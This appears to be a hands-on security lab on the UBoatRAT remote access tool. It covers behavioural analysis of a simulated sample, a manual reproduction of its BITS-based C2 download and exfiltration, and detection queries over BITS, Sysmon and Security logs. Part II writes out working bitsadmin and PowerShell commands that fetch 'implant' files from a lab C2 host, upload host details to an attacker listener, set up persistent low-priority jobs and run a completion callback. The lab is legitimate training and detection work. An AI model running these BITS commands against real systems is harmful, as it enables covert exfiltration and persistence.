![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# UBoatRAT — BITS-Based C2 and Exfiltration

# Windows VM · Ubuntu VM

## The objective of this lab is to reconstruct the behavioral fingerprint of UBoatRAT through guided dynamic analysis, reproduce its BITS-based command-and-control and exfiltration mechanism manually in a controlled environment, and build detection capabilities across Windows event sources and Sigma.

---

### Documentation and Scenario

**What is UBoatRAT?**

UBoatRAT is a Remote Access Tool (RAT) first publicly documented by Palo Alto Networks Unit42 in October 2017. It was deployed in targeted campaigns against gaming organisations in East Asia. Its name originates from the submarine-themed interface of its command-and-control panel.

Operationally, UBoatRAT demonstrates layered sophistication. Before executing its payload, it interrogates the target's network environment to confirm it is running on a victim host rather than an analysis sandbox. Rather than hardcoding the C2 server address into the binary — which static analysis would trivially expose — it uses a publicly accessible GitHub page as a **dead drop resolver**: a benign-looking URL that stores an encoded C2 address the malware retrieves at runtime. Once it has the C2 address, it delegates all file transfers to **Background Intelligent Transfer Service (BITS)** — a legitimate Windows component — rather than making direct socket connections from its own process.

That last design choice is the focus of this lab.

**MITRE ATT&CK Mapping:**

| Technique | ID | Tactic |
|---|---|---|
| BITS Jobs | T1197 | Persistence, Defense Evasion |
| Scheduled Task/Job | T1053.005 | Persistence, Execution |
| Ingress Tool Transfer | T1105 | Command and Control |
| Exfiltration Over C2 Channel | T1041 | Exfiltration |
| Dead Drop Resolver | T1102.001 | Command and Control |

**What is BITS?**

Background Intelligent Transfer Service is a built-in Windows component designed for asynchronous, bandwidth-throttled file transfers. It is the same mechanism Windows Update uses to download patches in the background without degrading foreground network performance. BITS is managed by the Service Control Manager and runs hosted inside **svchost.exe**.

From an attacker's perspective, BITS offers three structural advantages over rolling a custom HTTP client:

*Process attribution evasion*: Every BITS job, regardless of which process created it, executes under `svchost.exe`. A defender tracking outbound network connections by originating process name will see `svchost.exe` making HTTP connections — indistinguishable at a first glance from a Windows Update check.

*Firewall and proxy traversal*: BITS uses standard HTTP/HTTPS over ports 80 and 443. Outbound firewall rules almost never block these, and corporate proxies are preconfigured to forward them. No special egress rule is needed.

*Built-in persistence without registry writes*: BITS jobs persist across reboots until explicitly completed or cancelled. An incomplete job silently retries on a configurable schedule. No registry run key, no startup folder entry, and no additional scheduled task are required — the BITS service itself maintains the retry queue as part of its normal operation.

**Key Concepts:**

- *BITS Job*: An asynchronous file transfer task registered with the BITS service. A job carries a name, a list of files (each with a source URL and a destination path), a transfer type (download or upload), and a state that progresses through: Queued → Connecting → Transferring → Transferred → Acknowledged (Complete). A job can also be Suspended or in an Error state at any stage.

- *bitsadmin.exe*: A command-line utility for creating and managing BITS jobs. Marked deprecated in favour of PowerShell cmdlets, it nonetheless ships on every current Windows build and appears frequently in documented attack toolchains, valued precisely for its ubiquity.

- *Start-BitsTransfer*: The PowerShell-native BITS interface. Supports synchronous and asynchronous downloads, uploads, and complete job lifecycle management through the `BitsTransfer` module.

- *BITS Operational Log*: The Windows event log `Microsoft-Windows-Bits-Client/Operational` records all BITS job lifecycle events — creation, transfer start, completion, errors. It is the primary dedicated forensic source for this technique and the foundation of the detections you will build in Part III.

- *Transfer Type*: BITS supports `/download` (pulling files from a remote server to local disk) and `/upload` (pushing local files to a remote server accepting HTTP PUT). UBoatRAT uses both: download for pulling C2 payloads and instructions, upload for exfiltration.

>[!NOTE]
> No UBoatRAT binary is distributed or used in this lab. The simulation file deployed by the setup script replicates the **observable behavioral footprint** of UBoatRAT's BITS-based transfer mechanism, based exclusively on published threat intelligence. You will analyse behaviour, not malware code. There is no malware in this environment.

---

### SCENARIO

Your SOC has triaged an alert from an endpoint. An unusual executable appeared in `C:\Users\Public\Downloads\` on a Windows 11 workstation. The analyst who flagged it had already run it, reporting that "it didn't seem to do anything." The machine is isolated and available for live forensic analysis.

Your role shifts across the three parts of this lab, following the same progression a real security team works through from initial triage to operational prevention:

- **Part I — Behavioral Analysis**: You are a malware analyst. You have the suspicious file and a full analysis toolkit. You must determine what the file does — through evidence alone, before anyone tells you.
- **Part II — Technique Reproduction**: You are a red team operator. You now know the technique. You will reproduce it manually, command by command, to build deep mechanical understanding of how it works at every layer.
- **Part III — Detection Engineering**: You are a detection engineer. You will build the rules that would have caught this before the SOC alert was ever needed.

>[!IMPORTANT]
> The setup scripts for both VMs have already been run and a snapshot has been taken. When you finish the lab, close your session — the environment resets to the snapshot automatically.

---

## PART I — BEHAVIORAL ANALYSIS

*You are a malware analyst. You have received a suspicious executable. You do not yet know what it does.*

---

### Phase 1: Lab Initialization

Before touching the suspicious file, record the Ubuntu VM's IP address. You will need it throughout the lab to correlate network traffic.

1. On the **Ubuntu VM**, open the terminal. Note your IP address and start the C2 listener:

<img width="641" height="871" alt="image" src="https://github.com/user-attachments/assets/d0635fba-bf7a-41e3-9ecf-8a071ca94e77" />

```bash
cd ~/BnB/UBoatRAT
python3 ubuntu_c2_server.py
```

Leave this terminal open and running for the entire duration of the lab. The server must be active before the simulation executes.

2. On **Windows**, open a **PowerShell terminal as Administrator** and run the lab setup script:

<img width="589" height="442" alt="image" src="https://github.com/user-attachments/assets/205706cb-7719-4070-8c22-0e6e606760d1" />

- Run the lab setup script and fIll in the **Ubuntu IP** when prompted : 

```powershell
cd Desktop\Labs\UBoatRAT
.\lab_start.ps1
```
Wait for the last green **[+]** before continuing.

<img width="892" height="254" alt="image" src="https://github.com/user-attachments/assets/f5e03990-d793-4476-97da-58fbd1387364" />

>[!NOTE]
> `lab_start.ps1` verifies that the BITS Operational Log is enabled (`wevtutil sl Microsoft-Windows-Bits-Client/Operational /e:true`), confirms Sysmon is running, and enables Process Creation auditing via `auditpol /set /subcategory:"Process Creation" /success:enable`. These are prerequisites for Part III. On a real endpoint, these would be an analyst's first configuration steps before starting any dynamic analysis session.

---

### Phase 2: Pre-Execution Baseline

Establish a clean baseline across every tool before executing the suspicious file. Baseline data lets you subtract normal system noise and isolate exactly what the file introduces.

**Step 1 — Inspect the suspicious file:**

```powershell
Get-Item ".\WinSvcHelper.exe" |
  Select-Object Name, Length, CreationTime, LastWriteTime

(Get-AuthenticodeSignature ".\WinSvcHelper.exe").Status

(Get-Item ".\WinSvcHelper.exe").VersionInfo
```

<img width="1199" height="479" alt="image" src="https://github.com/user-attachments/assets/c2c42cb9-181c-456d-b969-90ff7068ef04" />

Record your findings. Is the file signed? Does it carry version metadata? What is its size? These become comparison data points for Phase 8.

**Step 2 — Baseline the BITS job queue:**

```powershell
bitsadmin /list /allusers
```

<img width="736" height="180" alt="image" src="https://github.com/user-attachments/assets/cd4661b6-d7e8-4ddd-92d2-4b96c95ad03c" />

No jobs are listed, record this as your clean state. Any new job appearing after execution is an artefact of the suspicious file.

**Step 3 — Start Process Monitor:**

Open **Process Monitor** from `C:\Tools\Procmon\Procmon.exe`. Allow it to run for ten seconds to collect baseline system noise, then pause capture with **CTRL+E**. Do not clear the events — the noise contrast will help distinguish normal activity from attack activity later.

<img width="1177" height="545" alt="image" src="https://github.com/user-attachments/assets/d748c8d8-7270-4989-ae00-b5de6d6a8658" />

**Step 4 — Start Wireshark:**

Open **Wireshark**. When selecting your capture interface, look for the one showing active network traffic — it will have a live sparkline next to its name in the interface list. This is typically labeled **Ethernet** (the primary virtual NIC assigned to your Windows VM). Avoid **VMware Network Adapter** entries (VMnet8, VMnet1, etc.) — these are internal virtual adapters that carry no inter-VM traffic between Windows and Ubuntu. If you are unsure which interface is active, hold **CTRL** and select multiple interfaces simultaneously, then narrow down after your first test capture.

Begin capturing and apply the display filter:

```
ip.addr == <UBUNTU_IP>
```

<img width="410" height="316" alt="image" src="https://github.com/user-attachments/assets/fbdeb04f-c62d-487f-b36a-607b225c451d" />

<img width="808" height="625" alt="image" src="https://github.com/user-attachments/assets/75ac8c41-3244-43b0-b550-755a4c501cd1" />

This shows only traffic to and from the Ubuntu VM — your simulated C2 server. Leave the capture running.

---

### Phase 3: Execution and Capture

Before executing the suspicious file, ensure both tools are actively recording.

- In Wireshark, confirm the capture is running with the display filter applied.

<img width="808" height="277" alt="image" src="https://github.com/user-attachments/assets/8b1fb817-fa57-4c52-a8f1-40d680e9b353" />

- In Process Monitor, press CTRL+E (or click the magnifying glass icon) to unpause and resume capturing. The number of events recorded by **Procmon** should start rising.

<img width="802" height="255" alt="image" src="https://github.com/user-attachments/assets/d855fd02-aec3-45d3-8637-04bde28cb30f" />

With both tools active, execute the file in your Administrator PowerShell:

In your **Administrator PowerShell**:

```powershell
cd C:\Users\Administrator\Desktop\Labs\UBoatRAT
.\WinSvcHelper.exe
```

<img width="1907" height="938" alt="image" src="https://github.com/user-attachments/assets/d1ab49d3-688d-4a27-872a-90ce62b9ebbf" />

The file produces no visible output. No window opens. No message appears. The prompt returns immediately.

**Wait 30 seconds** without interacting with any tool. BITS jobs are asynchronous — they may be queued rather than actively transferring at the moment of creation. 

After 30 seconds:

- Return to wireshark and press the STOP button :
  
<img width="902" height="246" alt="image" src="https://github.com/user-attachments/assets/f4972bfe-2d7e-4e49-a9f7-de363da9607f" />

- Return to Procmon and press **CTRL+E** to stop capture, or use the GUI.

<img width="920" height="266" alt="image" src="https://github.com/user-attachments/assets/8ff32872-ac3a-474a-b458-9ca0f6a5f02d" />

---

### Phase 4: Process Tree Analysis (Procmon)

With Procmon and Wireshark stopped, examine what happened.

**Step 1 — Apply process filters:**

Press **CTRL+L** in the Procmon window and configure using the drop-down menu:

- `Process Name` | `is` | `WinSvcHelper.exe` → Include

<img width="960" height="628" alt="image" src="https://github.com/user-attachments/assets/85ee99e3-2aca-4e92-8eb1-d62a6d82eda3" />

- `Process Name` | `is` | `powershell.exe` → Include

<img width="958" height="626" alt="image" src="https://github.com/user-attachments/assets/6093cbce-bf38-4666-9488-863236adbc37" />

- `Process Name` | `is` | `svchost.exe` → Include

<img width="958" height="623" alt="image" src="https://github.com/user-attachments/assets/da1629e6-62fe-4293-a829-9ee6b4f326e6" />

Apply and examine the filtered event list.

**Step 2 — Examine the process tree:**

The problem with looking at the process creation timeline to find the first instance of *WinSvcHelper.exe* is the sample size. It's like finding a needle in a haystack. However, we have tools. Go to **Tools -> Proccess Tree**:

<img width="872" height="430" alt="image" src="https://github.com/user-attachments/assets/d637aecf-4202-41cb-94e9-067b8b9cc6a1" />

Scroll down and try to find **WinSvcHelper.exe**. Look at the `Process Name` and `PID` columns across the captured events:

<img width="828" height="683" alt="image" src="https://github.com/user-attachments/assets/8175751d-fc20-4b2b-b7a6-1c065bebe80a" />

1. Did `WinSvcHelper.exe` spawn any child processes? What are they?
2. Is `powershell.exe` among them? What is its parent PID?
3. Is `svchost.exe` active? What operation types does it show?

Here we find that **WinSvcHelper.exe** spawned **Powershell**.
Close the process tree for the moment. 

**Before proceeding, document your answers:**

- [ ] What process executed the initial logic?
- [ ] What child process was spawned, if any?

---

### Phase 5: Network Traffic Analysis (Wireshark)

Switch to **Wireshark**. Your display filter `ip.addr == <UBUNTU_IP>` is still active.

**Step 1 — Follow the HTTP stream:**

Locate any HTTP traffic in the packet list. Right-click a packet and select **Follow → HTTP Stream**. This shows the full application-layer exchange.

1. What HTTP method was used — GET or PUT?
2. What is the **User-Agent** string in the request headers?
3. What URI paths were requested?
4. Is there both inbound activity (download) and outbound activity (upload)?

>[!NOTE]
> The User-Agent string is your most immediate indicator of which component generated this traffic. A standard BITS transfer uses a User-Agent string of the form `Microsoft BITS/X.X`. Compare this against what `Invoke-WebRequest`, `curl`, or a browser sends — they are distinct strings. That difference tells you something specific about which Windows subsystem opened this connection, and it is not the suspicious executable itself.

**Step 2 — Identify the source process:**

Open **Process Explorer** from `C:\Tools\ProcessExplorer\procexp.exe`. Locate instances of `svchost.exe`. Right-click the one showing active or recent network connections and select **Properties → TCP/IP** tab.

1. Is there a connection entry from `svchost.exe` to `<UBUNTU_IP>`?
2. Under the **Services** tab of the same Properties dialog: is `BITS` or `BITSSvc` listed among the services hosted in this `svchost.exe` instance?

**Before proceeding, document your answers:**

- [ ] What User-Agent string confirmed which Windows component was responsible for the traffic?
- [ ] What files were downloaded, and from what URI paths?
- [ ] Was any upload traffic observed? What was sent, and to which URI path?

---

### Phase 6: BITS Operational Log Analysis

Examine the dedicated BITS event log to see the job lifecycle record — independent of Procmon and Wireshark.

**Navigate in Event Viewer to:**

```
Applications and Services Logs
  → Microsoft
    → Windows
      → Bits-Client
        → Operational
```

Or query directly from PowerShell:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" |
  Sort-Object TimeCreated |
  Select-Object TimeCreated, Id,
    @{N='Summary'; E={ ($_.Message -split '\r?\n' | Select-Object -First 3) -join ' | ' }} |
  Format-Table -AutoSize -Wrap
```

**Step 1 — Job creation (Event ID 3):**

Locate events with ID **3**. What is the job name? Who is the owner?

**Step 2 — Transfer start (Event ID 59):**

Locate events with ID **59** (transfer started). Extract structured details:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" |
  Where-Object { $_.Id -eq 59 } |
  ForEach-Object {
    $xml = [xml]$_.ToXml()
    $data = $xml.Event.EventData.Data
    [PSCustomObject]@{
      Time       = $_.TimeCreated
      JobName    = ($data | Where-Object { $_.Name -eq 'name' }).'#text'
      RemoteUrl  = ($data | Where-Object { $_.Name -eq 'url' }).'#text'
      LocalFile  = ($data | Where-Object { $_.Name -eq 'localName' }).'#text'
      BytesTotal = ($data | Where-Object { $_.Name -eq 'bytesTotal' }).'#text'
    }
  } | Format-Table -AutoSize -Wrap
```

1. What is the source URL? **This is the C2 server address.**
2. What is the destination file path?

**Step 3 — Completion (Event ID 60):**

Locate events with ID **60**. How many bytes were transferred?

**Step 4 — Upload activity:**

Are there additional job names in the log beyond the first download job? Check for a second job used for upload. If present: what was sent, and to what destination URL?

**Before proceeding, document your answers:**

- [ ] The C2 server IP and port extracted from the source URL in Event ID 59
- [ ] The filename downloaded from the C2
- [ ] Whether a BITS upload job was observed and what it transferred
- [ ] The full name(s) of all BITS jobs created

---

### Phase 7: Validating Host Artefacts in Procmon

Now that you know exactly what the BITS job was instructed to do and where the payload was staged (Phase 6), return to **Process Monitor** — which you stopped in Phase 3 — to find the forensic evidence left on disk and in the registry. Working with this context makes the search targeted: you know exactly what to look for.

**Step 1 — Isolate File System Writes:**

Since BITS operates asynchronously through the Windows Service Control Manager, the payload is not written by `WinSvcHelper.exe` itself. From Phase 6, you identified the intended destination path. Find the exact moment it was written.

Press **CTRL+L** to open the filter menu. Click **Reset** to clear any previous filters, then configure the following:

- `Operation` | `contains` | `Write` → Include
- `Path` | `contains` | `ProgramData` → Include

<img width="640" height="376" alt="image" src="https://github.com/user-attachments/assets/d075d8ab-0be7-4ab8-9441-5e621d487e29" />

Apply the filter and examine the results.

1. Which process is writing to the BITS database (`edb.log`) or the destination file inside `ProgramData`?
2. Is there any write activity under `C:\Windows\System32\Tasks\` or `C:\ProgramData\`? Under which exact paths?
3. Does the responsible process align with what you observed in Wireshark in Phase 5?

**Step 2 — Identify Registry Writes (Persistence):**

Malware needs to survive a reboot. Since `WinSvcHelper.exe` spawned a background PowerShell process (confirmed in Phase 4), investigate what that PowerShell instance changed in the registry to establish persistence.

Change your filters (**CTRL+L**) by removing the previous rules and adding:

- `Operation` | `contains` | `RegSetValue` → Include
- `Process Name` | `is` | `powershell.exe` → Include

Apply the filter and examine the `Path` column.

1. Were any keys written under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\`?
2. What is the name of the scheduled task created for persistence?

>[!NOTE]
> Registry writes under the Schedule key indicate a scheduled task was created programmatically. Note the task name — you will cross-reference it in Part II as the persistence mechanism layered on top of BITS.

**Before proceeding, document your answers:**

- [ ] What process is physically responsible for writing BITS data to the disk?
- [ ] What files were created and where?
- [ ] Was a scheduled task created? What is its exact name?

---

### Phase 8: Evidence Summary — The Discovery

You now have corroborating evidence from four independent sources — process activity (Procmon), network traffic (Wireshark), process tree (Process Explorer), and the BITS Operational log. Synthesise your findings before moving to Part II.

| Question | Your Finding |
|---|---|
| What process started the execution chain? | |
| What child process was spawned? | |
| What persistence mechanism was established? | |
| What Windows service was used for all file transfers? | |
| What C2 IP and port were contacted? | |
| What was downloaded from the C2? | |
| Was data exfiltrated? What? | |
| What User-Agent string confirmed the transfer service? | |

**The Discovery:**

The suspicious file uses **Background Intelligent Transfer Service (BITS)** — a built-in, trusted Windows component — to perform both inbound transfers (pulling from a C2 server) and outbound transfers (exfiltrating data), while routing all network activity through `svchost.exe`. The binary itself makes no direct network connection.

This is **MITRE ATT&CK T1197 — BITS Jobs**. It matches the documented behavior of UBoatRAT. You arrived at this conclusion through evidence, not by being told.

---

## PART II — TECHNIQUE REPRODUCTION

*You are now a red team operator. You know the technique. Reproduce it manually, step by step, so that you understand the exact mechanism — not just the name.*

*The C2 server you started in Phase 1 is still running. Files are available for download under `/c2/` and HTTP PUT uploads are accepted at `/upload/` on port 8080.*

---

### Phase 9: BITS Download (C2 Pull)

Restart your Wireshark capture with filter `ip.addr == <UBUNTU_IP>` before beginning this phase. You want to observe each BITS operation in isolation.

**Step 1 — Create and execute a download job using bitsadmin:**

```powershell
# Create the job (state: SUSPENDED)
bitsadmin /create /download "C2_Pull"

# Register the file to transfer
bitsadmin /addfile "C2_Pull" "http://<UBUNTU_IP>:8080/c2/implant.dat" "C:\Users\Public\implant.dat"

# Inspect the job before starting — note the state, URL, and local path
bitsadmin /getinfo "C2_Pull"

# Start the transfer
bitsadmin /resume "C2_Pull"

# Poll state — repeat until TRANSFERRED
Start-Sleep -Seconds 3
bitsadmin /getinfo "C2_Pull"
```

Once the state reads **TRANSFERRED**, finalise:

```powershell
# Complete — moves the file from the BITS staging area to the declared destination path
bitsadmin /complete "C2_Pull"

# Verify
Get-Item "C:\Users\Public\implant.dat"
```

**Step 2 — Repeat using PowerShell's Start-BitsTransfer:**

```powershell
# Synchronous — blocks until complete
Start-BitsTransfer `
  -Source      "http://<UBUNTU_IP>:8080/c2/config.dat" `
  -Destination "C:\Users\Public\config.dat"

# Asynchronous — returns immediately; job runs in background
$job = Start-BitsTransfer `
  -Source      "http://<UBUNTU_IP>:8080/c2/beacon.dat" `
  -Destination "C:\Users\Public\beacon.dat" `
  -Asynchronous

# Monitor and finalise
$job | Get-BitsTransfer
$job | Complete-BitsTransfer
```

**Step 3 — Observe in Wireshark:**

Confirm that:

- HTTP traffic appeared with `svchost.exe` as the source process (verify in Process Explorer → TCP/IP tab)
- The User-Agent reads `Microsoft BITS/X.X`
- The URI path matches exactly what you specified in `/addfile` or `-Source`

This is mechanically identical to the traffic you observed in Phase 5. The connection between discovery and reproduction is now direct and visible.

---

### Phase 10: BITS Upload (Exfiltration)

The Ubuntu server accepts HTTP PUT requests at `/upload/` on port 8080.

**Step 1 — Prepare a file to exfiltrate:**

```powershell
"Hostname: $env:COMPUTERNAME`nUser: $env:USERNAME`nDate: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" |
  Out-File "C:\Users\Public\sensitive.txt" -Encoding UTF8
```

**Step 2 — Upload using bitsadmin:**

```powershell
bitsadmin /create /upload "Exfil_Job"
bitsadmin /addfile "Exfil_Job" "http://<UBUNTU_IP>:8080/upload/sensitive.txt" "C:\Users\Public\sensitive.txt"
bitsadmin /resume "Exfil_Job"

Start-Sleep -Seconds 5
bitsadmin /getinfo "Exfil_Job"
bitsadmin /complete "Exfil_Job"
```

**Step 3 — Verify receipt on the Ubuntu server:**

Switch to the **Ubuntu terminal**:

```bash
cat ~/BnB/UBoatRAT/uploads/sensitive.txt
```

Your hostname and username are now visible on the attacker-controlled server.

**Step 4 — Repeat with PowerShell:**

```powershell
Start-BitsTransfer `
  -Source       "C:\Users\Public\sensitive.txt" `
  -Destination  "http://<UBUNTU_IP>:8080/upload/sensitive_v2.txt" `
  -TransferType Upload
```

>[!NOTE]
> BITS upload requires the receiving server to support HTTP PUT on the target path. The Ubuntu setup script configures this. In documented UBoatRAT campaigns, files were staged locally and transferred via BITS upload to an attacker-controlled HTTP listener — structurally identical to what you just performed.

---

### Phase 11: BITS Stealth and Persistence Properties

This phase deliberately examines the properties that make BITS valuable to attackers beyond basic file transfer — the same properties that made the Part I simulation difficult to immediately characterise.

**Step 1 — Job persistence (survives reboot without a registry key):**

```powershell
# Create a job but leave it in a deferred state
bitsadmin /create /download "PersistentBeacon"
bitsadmin /addfile "PersistentBeacon" "http://<UBUNTU_IP>:8080/c2/beacon.dat" "C:\ProgramData\beacon.dat"
bitsadmin /setretrydelay "PersistentBeacon" 60
bitsadmin /resume "PersistentBeacon"
bitsadmin /suspend "PersistentBeacon"

# Confirm the job is registered
bitsadmin /list /allusers /verbose
```

This job is now persistent. The BITS service will attempt to resume it after the next system reboot — with no registry run key, no startup folder entry, and no task scheduler involvement. Persistence is implicit in the job registration itself.

```powershell
# Cancel before moving on
bitsadmin /cancel "PersistentBeacon"
```

**Step 2 — Priority manipulation (throttled, low-visibility exfiltration):**

```powershell
bitsadmin /create /upload "LowPriorityExfil"
bitsadmin /addfile "LowPriorityExfil" "http://<UBUNTU_IP>:8080/upload/throttled.txt" "C:\Users\Public\sensitive.txt"
bitsadmin /setpriority "LowPriorityExfil" LOW
bitsadmin /resume "LowPriorityExfil"
bitsadmin /getinfo "LowPriorityExfil"
```

A LOW-priority BITS job transfers only when the network interface is otherwise idle. The exfiltration completes eventually but never appears as a bandwidth spike — a common detection heuristic it cleanly sidesteps.

```powershell
bitsadmin /cancel "LowPriorityExfil"
```

**Step 3 — Callback execution on completion:**

```powershell
bitsadmin /create /download "CallbackJob"
bitsadmin /addfile "CallbackJob" "http://<UBUNTU_IP>:8080/c2/next_stage.dat" "C:\ProgramData\next_stage.dat"

# Register a command to execute silently when the transfer finishes
bitsadmin /setnotifycmdline "CallbackJob" "cmd.exe" "/c echo BITS_CALLBACK_FIRED >> C:\Users\Public\bits_callback.log"

bitsadmin /resume "CallbackJob"
```

Wait for the transfer to complete, then verify:

```powershell
Get-Content "C:\Users\Public\bits_callback.log"
```

The callback executed silently, triggered by the BITS service at transfer completion — no scheduled task, no registry run key, no visible mechanism. This is how malware can chain a BITS download directly into payload execution without leaving an additional persistence artefact.

**Step 4 — Enumerate and clean up all jobs from this phase:**

```powershell
Get-BitsTransfer -AllUsers | Format-Table DisplayName, JobState, TransferType, BytesTotal

# Cancel any remaining jobs
Get-BitsTransfer -AllUsers | Remove-BitsTransfer
```

---

### Phase 12: Connecting Part I to Part II

Before moving to detection, map each observation from the Part I behavioural analysis to the technique you reproduced in Part II:

| Observation (Part I — Discovery) | Technique (Part II — Reproduction) |
|---|---|
| BITS download job created by simulation | Phase 9: `bitsadmin /create /download` |
| HTTP GET from `svchost.exe` to Ubuntu IP | Phase 9: svchost.exe visible in Wireshark and Process Explorer during transfer |
| User-Agent: `Microsoft BITS/X.X` | Phase 9, 10: inherent to all BITS transfers regardless of which process creates the job |
| File written to `C:\ProgramData\` | Phase 9: `bitsadmin /complete` moves from staging to declared destination |
| BITS upload job for outbound data | Phase 10: `bitsadmin /create /upload` |
| Job retried without user interaction | Phase 11: `setretrydelay` + suspended job lifecycle |
| Callback execution at download completion | Phase 11: `setnotifycmdline` |
| Scheduled task written to registry (persistence) | Layered mechanism above BITS — observed in Phase 7 Step 2 |

Every artefact you found in Part I has a direct, reproducible equivalent in Part II. The discovery and the reproduction are the same mechanism observed from opposite sides.

---

## PART III — DETECTION ENGINEERING

*You are now a detection engineer. Build the rules that would have caught this at the earliest possible point in the kill chain.*

---

### Phase 13: BITS Operational Log — Event ID Mapping

The BITS Operational log is the most specific and targeted source for this technique. It requires no additional tooling — it is built into Windows.

**Step 1 — Query all relevant events from the lab session:**

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" -MaxEvents 500 |
  Where-Object { $_.Id -in @(3, 4, 59, 60, 16) } |
  Sort-Object TimeCreated |
  Select-Object TimeCreated, Id,
    @{N='Summary'; E={ ($_.Message -split '\r?\n' | Select-Object -First 2) -join ' | ' }} |
  Format-Table -AutoSize -Wrap
```

**Step 2 — Extract structured transfer details from Event ID 59:**

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" |
  Where-Object { $_.Id -eq 59 } |
  ForEach-Object {
    $xml  = [xml]$_.ToXml()
    $data = $xml.Event.EventData.Data
    [PSCustomObject]@{
      Time       = $_.TimeCreated
      JobName    = ($data | Where-Object { $_.Name -eq 'name' }).'#text'
      RemoteUrl  = ($data | Where-Object { $_.Name -eq 'url' }).'#text'
      LocalFile  = ($data | Where-Object { $_.Name -eq 'localName' }).'#text'
      BytesTotal = ($data | Where-Object { $_.Name -eq 'bytesTotal' }).'#text'
    }
  } | Format-Table -AutoSize -Wrap
```

**Step 3 — Identify the detection signal:**

Answer before continuing:

1. Which Event ID fires at the moment a malicious BITS job begins transferring?
2. Which structured field in that event contains the C2 server address?
3. What property distinguishes a malicious BITS URL from a Windows Update URL in this log?

>[!NOTE]
> The distinguishing property is `RemoteUrl` in Event ID 59. Windows Update BITS jobs use hostnames under `*.windowsupdate.microsoft.com`, `*.download.windowsupdate.com`, and `*.delivery.mp.microsoft.com`. A job using a raw IP address, a non-standard port, or an unknown domain is immediately actionable. In a production environment, build an allowlist of your environment's legitimate BITS URLs before writing exclusion logic.

**Event ID reference:**

| ID | Meaning | Detection Value |
|---|---|---|
| 3 | New BITS job created | Low — fires on all jobs including Windows Update |
| 4 | BITS job modified | Low — follow-up to job creation |
| 59 | BITS transfer started | **High** — contains remote URL, ideal filter point |
| 60 | BITS transfer completed | Medium — confirms successful transfer |
| 16 | BITS transfer error / retry | Medium — repeated errors to a suspicious IP are a signal |

---

### Phase 14: Sysmon Event Analysis

Sysmon provides a second, independent detection layer that correlates BITS activity with process and network context — catching it through a different lens than the BITS log alone.

**Step 1 — Network connections from svchost.exe (Event ID 3):**

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object { $_.Id -eq 3 } |
  ForEach-Object {
    $xml  = [xml]$_.ToXml()
    $data = $xml.Event.EventData.Data
    [PSCustomObject]@{
      Time         = $_.TimeCreated
      Image        = ($data | Where-Object { $_.Name -eq 'Image' }).'#text'
      DestIP       = ($data | Where-Object { $_.Name -eq 'DestinationIp' }).'#text'
      DestPort     = ($data | Where-Object { $_.Name -eq 'DestinationPort' }).'#text'
      DestHostname = ($data | Where-Object { $_.Name -eq 'DestinationHostname' }).'#text'
    }
  } |
  Where-Object { $_.Image -like '*svchost*' -and $_.DestPort -in @('80','8080','443') } |
  Format-Table -AutoSize
```

Detection signal: `svchost.exe` connecting to an IP that does not resolve to a Microsoft or known-vendor hostname.

**Step 2 — Process creation for bitsadmin.exe (Event ID 1):**

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object { $_.Id -eq 1 } |
  ForEach-Object {
    $xml  = [xml]$_.ToXml()
    $data = $xml.Event.EventData.Data
    [PSCustomObject]@{
      Time        = $_.TimeCreated
      Image       = ($data | Where-Object { $_.Name -eq 'Image' }).'#text'
      CommandLine = ($data | Where-Object { $_.Name -eq 'CommandLine' }).'#text'
      ParentImage = ($data | Where-Object { $_.Name -eq 'ParentImage' }).'#text'
    }
  } |
  Where-Object { $_.Image -like '*bitsadmin*' } |
  Format-Table -AutoSize -Wrap
```

Detection signal: `bitsadmin.exe` executing on any endpoint that has no documented administrative use case for it.

**Step 3 — File creation by svchost.exe (Event ID 11):**

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object { $_.Id -eq 11 } |
  ForEach-Object {
    $xml  = [xml]$_.ToXml()
    $data = $xml.Event.EventData.Data
    [PSCustomObject]@{
      Time       = $_.TimeCreated
      Image      = ($data | Where-Object { $_.Name -eq 'Image' }).'#text'
      TargetFile = ($data | Where-Object { $_.Name -eq 'TargetFilename' }).'#text'
    }
  } |
  Where-Object { $_.Image -like '*svchost*' } |
  Format-Table -AutoSize -Wrap
```

Detection signal: files written by `svchost.exe` outside `C:\Windows\SoftwareDistribution\` and `C:\Windows\Temp\`. BITS's legitimate delivery targets are well-known — anything outside them is anomalous.

---

### Phase 15: Kill Chain Timeline Reconstruction

Merge all three log sources into a single timeline ordered by timestamp. This reconstructs the complete attack sequence from initial execution to exfiltration as a unified narrative.

```powershell
$bits = Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" |
  Where-Object { $_.Id -in @(3, 59, 60) } |
  Select-Object TimeCreated,
    @{N='Source';  E={'BITS-Operational'}},
    @{N='EventID'; E={$_.Id}},
    @{N='Detail';  E={($_.Message -split '\r?\n' | Select-Object -First 1)}}

$sysmon = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object { $_.Id -in @(1, 3, 11, 13) } |
  Select-Object TimeCreated,
    @{N='Source';  E={'Sysmon'}},
    @{N='EventID'; E={$_.Id}},
    @{N='Detail';  E={($_.Message -split '\r?\n' | Select-Object -First 1)}}

$security = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 100 |
  Where-Object { $_.Message -match 'WinSvcHelper|bitsadmin|powershell' } |
  Select-Object TimeCreated,
    @{N='Source';  E={'Security-4688'}},
    @{N='EventID'; E={$_.Id}},
    @{N='Detail';  E={($_.Message -split '\r?\n' | Select-Object -First 1)}}

($bits + $sysmon + $security) |
  Sort-Object TimeCreated |
  Format-Table TimeCreated, Source, EventID, Detail -AutoSize -Wrap
```

Map each event in your output to the corresponding kill chain stage:

| Kill Chain Stage | Expected Event(s) |
|---|---|
| Initial Execution | Security 4688 — WinSvcHelper.exe |
| Execution Chain | Sysmon 1 — powershell.exe child of WinSvcHelper |
| Persistence Established | Sysmon 13 — Registry write under Schedule key |
| C2 Channel Opened | BITS 3 — download job created |
